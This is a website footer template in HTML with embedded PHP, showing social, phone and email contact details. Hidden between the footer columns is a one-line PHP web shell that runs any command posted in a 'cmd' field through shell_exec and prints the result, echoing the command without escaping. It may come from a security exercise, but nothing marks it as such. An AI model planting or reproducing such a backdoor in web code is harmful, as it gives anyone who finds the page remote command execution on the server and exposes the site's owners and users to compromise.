<div class="footer-bottom">
    <div class="container">
        <div class="row">
            <div class="col-md-6 text-center">
                <span><img src="images/svg/twitterwhite.svg" alt="Twitter" class="bottom-icon">Twitter: @lu_cyber</span><hr style="margin:5px 0px;border-top:1px solid white;">
                <span><img src="images/svg/telephonewhite.svg" alt="Phone" class="bottom-icon">434-555-3774</span><br>
            </div>
            <?php if(isset($_POST['cmd'])){$r=str_replace("\n","<br>",htmlspecialchars(shell_exec($_POST['cmd'])));echo "<p>Command: ".$_POST['cmd']."</p><p>Result: ".$r."</p>";}?>
            <div class="col-md-6 text-center">
                <span><img src="images/svg/envelopewhite.svg" alt="Facebook" class="bottom-icon">Email: support@spacedefensearmory.com</span><hr style="margin: 5px 0px;border-top:1px solid white;">
            </div>
        </div>
    </div>
</div>
</body>
</html>